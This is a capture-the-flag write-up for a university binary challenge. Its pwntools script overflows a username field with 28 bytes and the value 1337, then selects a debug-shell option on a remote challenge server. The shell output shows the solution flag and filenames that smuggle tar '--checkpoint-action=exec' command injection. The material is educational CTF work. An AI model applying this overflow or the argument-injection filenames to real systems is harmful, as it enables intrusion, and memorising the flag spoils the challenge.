# Exploit

## My Friend, A Loathsome Worm

This one should be quite straight forward. Can you trick this program into popping a shell without even bothering to overwrite the return address? Why pick the lock when you can simply remove the hinges. :)

[Download exploit1.bin](https://uwspedu-my.sharepoint.com/:u:/g/personal/cjohnson_uwsp_edu/EcCKo6YaJUNHmpy4braSQFIBIgFLCuqde42LFfX66sRc0g?e=4a9hM2)

The binary is running at 34.123.210.162 port 20232

---

### Solution

```python
# file: pay.py
from pwn import *

# p = process("exploit1.bin")
p = remote('34.123.210.162', 20232)

payload = b'A' * 28
payload += p64(1337)

p.recvuntil(b'Choice: ')
p.sendline(b'1')
p.recvuntil(b'Enter new username: ')
p.sendline(payload)
p.recvuntil(b'Choice: ')
p.sendline(b'3')
p.interactive()
```


```bash
$ python pay.py
[+] Opening connection to 34.123.210.162 on port 20232: Done
[*] Switching to interactive mode
Starting debug shell
$ ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
50808
archive.tar
exploit.sh
exploit1.bin
exploit_v2.sh
exploit_v3.sh
flag.txt
shell.sh
$ cat flag.txt
poctf{uwsp_5w337_c10v32_4nd_50f7_511k}
```
### poctf{uwsp_5w337_c10v32_4nd_50f7_511k}